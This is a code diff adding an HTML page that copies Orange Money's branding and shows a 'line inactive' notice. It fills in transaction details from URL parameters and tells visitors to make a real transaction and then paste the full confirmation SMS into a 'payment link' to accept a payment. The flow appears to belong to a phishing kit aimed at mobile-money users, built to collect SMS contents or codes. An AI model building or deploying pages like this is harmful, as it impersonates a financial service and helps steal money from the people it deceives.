@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Orange Money · Ligne inactive</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --orange-main: #FF7900;
+    --orange-dark: #E56A00;
+    --orange-light: #FFF3E6;
+    --orange-black: #000000;
+    --orange-gray: #6B7280;
+    --orange-border: #E5E7EB;
+    --orange-soft: #F8FAFC;
+    --orange-page: #F1F5F9;
+    --orange-amber: #D97706;
+    --orange-amber-soft: #FFF7ED;
+    --orange-amber-border: #FED7AA;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--orange-page); color: var(--orange-black);
+    -webkit-font-smoothing: antialiased; line-height: 1.45;
+    min-height: 100vh; display: flex; justify-content: center; padding: 0;
+  }
+  .phone {
+    width: 100%; max-width: 430px; min-height: 100vh;
+    background: #fff; display: flex; flex-direction: column;
+    position: relative; overflow: hidden;
+  }
+  .top {
+    position: relative; flex-shrink: 0;
+    background: linear-gradient(180deg, #1A1A1A 0%, var(--orange-main) 100%);
+    padding: 18px 22px 26px;
+    border-bottom-left-radius: 38% 32px;
+    border-bottom-right-radius: 38% 32px;
+  }
+  .top-row {
+    display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  }
+  .brand {
+    display: inline-flex; align-items: baseline; gap: 2px;
+    font-weight: 900; font-size: 18px; letter-spacing: -0.4px; color: #fff;
+  }
+  .brand .orange { color: #fff; }
+  .brand .money { color: var(--orange-light); opacity: 0.95; }
+  .page-title {
+    margin-top: 22px; font-size: 19px; font-weight: 800;
+    color: #fff; letter-spacing: -0.3px; line-height: 1.25;
+  }
+  .page-sub {
+    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.78);
+    line-height: 1.5; max-width: 320px;
+  }
+  .body {
+    flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
+    padding: 28px 22px 24px;
+    display: flex; flex-direction: column;
+  }
+  .hero-icon {
+    width: 76px; height: 76px; border-radius: 50%;
+    background: var(--orange-amber);
+    display: inline-flex; align-items: center; justify-content: center;
+    margin: 0 auto 20px;
+    box-shadow: 0 0 0 6px rgba(217,119,6,0.12),
+                0 10px 22px rgba(217,119,6,0.28);
+  }
+  .hero-icon svg {
+    width: 38px; height: 38px;
+    stroke: #fff; fill: none;
+    stroke-width: 3.2; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .status-title {
+    font-size: 20px; font-weight: 800; letter-spacing: -0.4px;
+    color: var(--orange-black); text-align: center;
+    line-height: 1.3; margin-bottom: 8px;
+  }
+  .status-desc {
+    font-size: 13px; color: var(--orange-gray); line-height: 1.6;
+    text-align: center; max-width: 320px; margin: 0 auto 20px;
+  }
+  .notice-box {
+    background: var(--orange-amber-soft);
+    border: 1px solid var(--orange-amber-border);
+    border-left: 3px solid var(--orange-amber);
+    border-radius: 12px;
+    padding: 14px 16px;
+    font-size: 13px;
+    color: #7C2D12;
+    line-height: 1.65;
+    margin-bottom: 20px;
+  }
+  .notice-box strong {
+    color: #9A3412; font-weight: 800; display: block;
+    margin-bottom: 8px; font-size: 13.5px;
+  }
+  .notice-box ol { margin: 0; padding-left: 18px; }
+  .notice-box ol li { margin-bottom: 6px; }
+  .notice-box ol li:last-child { margin-bottom: 0; }
+  .notice-box .foot-note {
+    display: block; margin-top: 8px; font-size: 12px;
+    color: #9A3412; line-height: 1.55;
+  }
+  .detail-list {
+    background: var(--orange-soft);
+    border: 1px solid var(--orange-border);
+    border-radius: 12px;
+    padding: 4px 16px;
+    margin-bottom: 20px;
+  }
+  .detail-row {
+    display: flex; justify-content: space-between; align-items: flex-start;
+    padding: 11px 0; border-bottom: 1px solid #EDF0F4;
+    font-size: 12.5px; gap: 12px;
+  }
+  .detail-row:last-child { border-bottom: none; }
+  .detail-row .k { color: var(--orange-gray); flex-shrink: 0; }
+  .detail-row .v {
+    font-weight: 600; text-align: right;
+    word-break: break-word; color: var(--orange-black);
+  }
+  .detail-row .v.status-warn { color: var(--orange-amber); font-weight: 700; }
+  .orange-footer {
+    width: 100%; margin-top: 4px;
+    background: var(--orange-light);
+    border: 1px solid var(--orange-main);
+    border-radius: 12px;
+    padding: 14px 16px;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; text-align: left;
+  }
+  .orange-footer .foot-brand {
+    display: inline-flex; align-items: baseline; gap: 2px;
+    font-weight: 900; font-size: 15px; letter-spacing: -0.4px; color: var(--orange-black);
+  }
+  .orange-footer .foot-brand .orange { color: var(--orange-main); }
+  .orange-footer .foot-brand .money { color: var(--orange-black); opacity: 0.85; }
+  .orange-footer .foot-support {
+    font-size: 11px; color: var(--orange-black); line-height: 1.45; font-weight: 600;
+    text-align: right;
+  }
+  .orange-footer .foot-support strong { font-weight: 800; }
+  .close-btn {
+    width: 100%; margin-top: 16px; height: 52px;
+    background: var(--orange-main); color: #fff;
+    border: none; border-radius: 999px;
+    font-family: inherit; font-size: 15px; font-weight: 800;
+    letter-spacing: 0.4px; cursor: pointer;
+    box-shadow: 0 10px 24px rgba(255,121,0,0.28);
+    transition: filter .15s, transform .1s;
+  }
+  .close-btn:hover { filter: brightness(1.08); }
+  .close-btn:active { transform: scale(0.99); }
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
+    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+  @media (max-width: 380px) {
+    .top { padding: 16px 18px 22px; }
+    .body { padding: 22px 18px 18px; }
+    .brand { font-size: 16px; }
+    .page-title { font-size: 17px; }
+    .hero-icon { width: 64px; height: 64px; }
+    .hero-icon svg { width: 32px; height: 32px; }
+    .status-title { font-size: 18px; }
+    .close-btn { height: 48px; font-size: 14px; }
+  }
+  @media (min-width: 640px) {
+    body { padding: 32px 0; align-items: center; }
+    .phone {
+      min-height: calc(100vh - 64px); max-height: 900px;
+      border-radius: 32px;
+      box-shadow: 0 40px 100px rgba(255,121,0,0.18);
+      overflow: hidden;
+    }
+    .top { border-top-left-radius: 32px; border-top-right-radius: 32px; }
+  }
+  @media print {
+    body { background: #fff; padding: 0; }
+    .close-btn, .orange-footer { display: none !important; }
+    .phone { box-shadow: none; }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="top">
+    <div class="top-row">
+      <div class="brand"><span class="orange">Orange</span><span class="money">&nbsp;Money</span></div>
+    </div>
+    <div class="page-title" id="pageTitle">Ligne inactive</div>
+    <div class="page-sub" id="pageSub">Cette ligne Orange Money est actuellement inactive sur cet appareil. Effectuez une transaction sur votre ligne pour la réactiver, puis réessayez.</div>
+  </div>
+
+  <div class="body">
+
+    <div class="hero-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24">
+        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+        <line x1="12" y1="9" x2="12" y2="13"/>
+        <line x1="12" y1="17" x2="12.01" y2="17"/>
+      </svg>
+    </div>
+
+    <div class="status-title" id="statusTitle">Ligne inactive</div>
+    <div class="status-desc" id="statusDesc">
+      Cette ligne Orange Money est actuellement inactive. Pour la réactiver, veuillez effectuer une transaction sur votre ligne.
+    </div>
+
+    <div class="notice-box">
+      <strong id="noticeTitle">Que devez-vous faire ?</strong>
+      <ol id="noticeSteps">
+        <li><strong>Effectuez une transaction</strong> sur votre ligne Orange Money (envoyer de l'argent, acheter du crédit, ou payer une facture)</li>
+        <li>Attendez le <strong>SMS de confirmation</strong> d'Orange Money</li>
+        <li>Revenez sur cette page et <strong>appuyez à nouveau sur « Accepter le paiement »</strong></li>
+      </ol>
+      <span class="foot-note" id="noticeFoot">Si votre ligne est toujours inactive après une transaction, contactez le support Orange Money ou visitez votre agence la plus proche avec votre pièce d'identité.</span>
+    </div>
+
+    <div class="detail-list">
+      <div class="detail-row"><span class="k" id="kTransaction">Transaction</span><span class="v" id="txId">—</span></div>
+      <div class="detail-row"><span class="k" id="kRecipient">Bénéficiaire</span><span class="v" id="recipientName">—</span></div>
+      <div class="detail-row"><span class="k" id="kAmount">Montant</span><span class="v" id="amountLabel">—</span></div>
+      <div class="detail-row"><span class="k" id="kCountry">Pays</span><span class="v" id="countryLabel">—</span></div>
+      <div class="detail-row"><span class="k" id="kStatus">Statut</span><span class="v status-warn" id="statusLabel">Ligne inactive</span></div>
+    </div>
+
+    <div class="orange-footer">
+      <div class="foot-brand"><span class="orange">Orange</span><span class="money">&nbsp;Money</span></div>
+      <div class="foot-support">
+        <span id="needHelpLabel">Besoin d'aide ?</span><br>
+        <span id="callLabel">Appelez le</span> <strong id="supportNum">—</strong>
+      </div>
+    </div>
+
+    <button class="close-btn" onclick="closePage()" id="closeBtn">Fermer</button>
+
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>  const I18N = {
+    fr: {
+      docTitle: 'Orange Money · Ligne inactive',
+      pageTitle: 'Ligne inactive',
+      pageSub: 'Cette ligne Orange Money est actuellement inactive. Effectuez une transaction sur votre ligne pour la réactiver, puis réessayez.',
+      statusTitle: 'Ligne inactive',
+      statusDesc: 'Cette ligne Orange Money est actuellement inactive. Pour la réactiver, veuillez effectuer une transaction sur votre ligne.',
+      noticeTitle: 'Que devez-vous faire ?',
+      noticeSteps: [
+        '<strong>Effectuez une transaction</strong> sur votre ligne Orange Money (envoyer de l\'argent, acheter du crédit, ou payer une facture)',
+        'Attendez le <strong>SMS de confirmation</strong> d\'Orange Money',
+        'Revenez sur cette page et <strong>appuyez à nouveau sur « Accepter le paiement »</strong>'
+      ],
+      noticeFoot: 'Si votre ligne est toujours inactive après une transaction, contactez le support Orange Money ou visitez votre agence la plus proche avec votre pièce d\'identité.',
+      kTransaction: 'Transaction',
+      kRecipient: 'Bénéficiaire',
+      kAmount: 'Montant',
+      kCountry: 'Pays',
+      kStatus: 'Statut',
+      statusLabel: 'Ligne inactive',
+      needHelp: 'Besoin d\'aide ?',
+      callLabel: 'Appelez le',
+      close: 'Fermer',
+      noticeTitleFullSms: 'Ligne inactive',
+      statusDescFullSms: 'Le message que vous avez soumis était incomplet et cette ligne est actuellement inactive. Effectuez une transaction sur votre ligne pour la réactiver.',
+      noticeStepsFullSms: [
+        '<strong>Effectuez une transaction</strong> sur votre ligne Orange Money (envoyer de l\'argent, acheter du crédit, ou payer une facture)',
+        'Attendez le <strong>SMS de confirmation</strong> d\'Orange Money',
+        'Revenez sur le lien de paiement et <strong>collez le message complet</strong>'
+      ]
+    },
+    en: {
+      docTitle: 'Orange Money · Line Inactive',
+      pageTitle: 'Line Inactive',
+      pageSub: 'This Orange Money line is currently inactive. Complete a transaction on your line to reactivate it, then try again.',
+      statusTitle: 'Line Inactive',
+      statusDesc: 'This Orange Money line is currently inactive. To reactivate it, please complete a transaction on your line.',
+      noticeTitle: 'What should you do?',
+      noticeSteps: [
+        '<strong>Make a transaction</strong> on your Orange Money line (send money, buy airtime, or pay a bill)',
+        'Wait for the <strong>confirmation SMS</strong> from Orange Money',
+        'Come back to this page and <strong>tap "Accept payment" again</strong>'
+      ],
+      noticeFoot: 'If your line is still inactive after a transaction, contact Orange Money support or visit your nearest agency with your ID.',
+      kTransaction: 'Transaction',
+      kRecipient: 'Recipient',
+      kAmount: 'Amount',
+      kCountry: 'Country',
+      kStatus: 'Status',
+      statusLabel: 'Line Inactive',
+      needHelp: 'Need help?',
+      callLabel: 'Call',
+      close: 'Close',
+      noticeTitleFullSms: 'Line Inactive',
+      statusDescFullSms: 'The message you submitted was incomplete and this line is currently inactive. Complete a transaction on your line to reactivate it.',
+      noticeStepsFullSms: [
+        '<strong>Make a transaction</strong> on your Orange Money line (send money, buy airtime, or pay a bill)',
+        'Wait for the <strong>confirmation SMS</strong> from Orange Money',
+        'Come back to the payment link and <strong>paste the full message</strong>'
+      ]
+    }
+  };
+
+  const urlParams = new URLSearchParams(location.search);
+  const urlLang = (urlParams.get('lang') || '').toLowerCase();
+  let currentLang = I18N[urlLang] ? urlLang : 'fr';
+  let T = I18N[currentLang];
+
+  const SUPPORT_NUMBERS = {
+    'Cameroun': '1500', 'Côte d\'Ivoire': '1500', 'Sénégal': '1500',
+    'Mali': '1500', 'Burkina Faso': '1500', 'Guinée': '1500', 'Liberia': '1500'
+  };
+
+  function formatAmount(amount, currency) {
+    const n = Number(amount);
+    if (!isFinite(n)) return '—';
+    const locale = (currentLang === 'fr') ? 'fr-FR' : 'en-US';
+    return n.toLocaleString(locale, { maximumFractionDigits: 2 }) + ' ' + (currency || '');
+  }
+
+  const tx = {
+    ref: urlParams.get('tx') || '',
+    am:  urlParams.get('am') || '',
+    cur: urlParams.get('cur') || '',
+    rn:  urlParams.get('rn') || '',
+    c:   urlParams.get('c') || '',
+    pm:  urlParams.get('pm') || '',
+    sn:  urlParams.get('sn') || '',
+    mk:  urlParams.get('mk') || '',
+    an:  urlParams.get('an') || '',
+    dt:  urlParams.get('dt') || '',
+    reason: urlParams.get('reason') || ''
+  };
+
+  function applyTranslations() {
+    document.title = T.docTitle;
+    document.getElementById('pageTitle').textContent = T.pageTitle;
+    document.getElementById('pageSub').textContent = T.pageSub;
+    document.getElementById('statusTitle').textContent = T.statusTitle;
+    document.getElementById('statusDesc').textContent = T.statusDesc;
+    document.getElementById('noticeTitle').textContent = T.noticeTitle;
+    document.getElementById('noticeFoot').textContent = T.noticeFoot;
+    document.getElementById('kTransaction').textContent = T.kTransaction;
+    document.getElementById('kRecipient').textContent = T.kRecipient;
+    document.getElementById('kAmount').textContent = T.kAmount;
+    document.getElementById('kCountry').textContent = T.kCountry;
+    document.getElementById('kStatus').textContent = T.kStatus;
+    document.getElementById('statusLabel').textContent = T.statusLabel;
+    document.getElementById('needHelpLabel').textContent = T.needHelp;
+    document.getElementById('callLabel').textContent = T.callLabel;
+    document.getElementById('closeBtn').textContent = T.close;
+
+    const ol = document.getElementById('noticeSteps');
+    if (ol) {
+      ol.innerHTML = T.noticeSteps.map(s => '<li>' + s + '</li>').join('');
+    }
+  }
+
+  function populate() {
+    applyTranslations();
+
+    document.getElementById('txId').textContent = tx.ref || '—';
+    document.getElementById('recipientName').textContent = tx.rn || '—';
+    document.getElementById('amountLabel').textContent =
+      tx.am ? formatAmount(tx.am, tx.cur) : '—';
+    document.getElementById('countryLabel').textContent = tx.c || '—';
+    document.getElementById('supportNum').textContent = SUPPORT_NUMBERS[tx.c] || '—';
+
+    if (tx.reason === 'needs_full_sms') {
+      document.getElementById('statusTitle').textContent = T.noticeTitleFullSms;
+      document.getElementById('statusDesc').textContent = T.statusDescFullSms;
+      document.getElementById('statusLabel').textContent = T.statusLabel;
+      const ol = document.getElementById('noticeSteps');
+      if (ol) {
+        ol.innerHTML = T.noticeStepsFullSms.map(s => '<li>' + s + '</li>').join('');
+      }
+    }
+  }
+
+  function closePage() {
+    if (tx.ref) {
+      try {
+        const base = new URL('index.html', window.location.href);
+        base.search = '?r=' + encodeURIComponent(tx.ref) + '&lang=' + encodeURIComponent(currentLang);
+        base.hash = '';
+        window.location.href = base.toString();
+        return;
+      } catch (e) {}
+    }
+    if (history.length > 1) {
+      history.back();
+    } else {
+      window.location.href = 'index.html';
+    }
+  }
+
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape') closePage();
+  });
+
+  document.addEventListener('DOMContentLoaded', populate);
+</script>
+</body>
+</html>
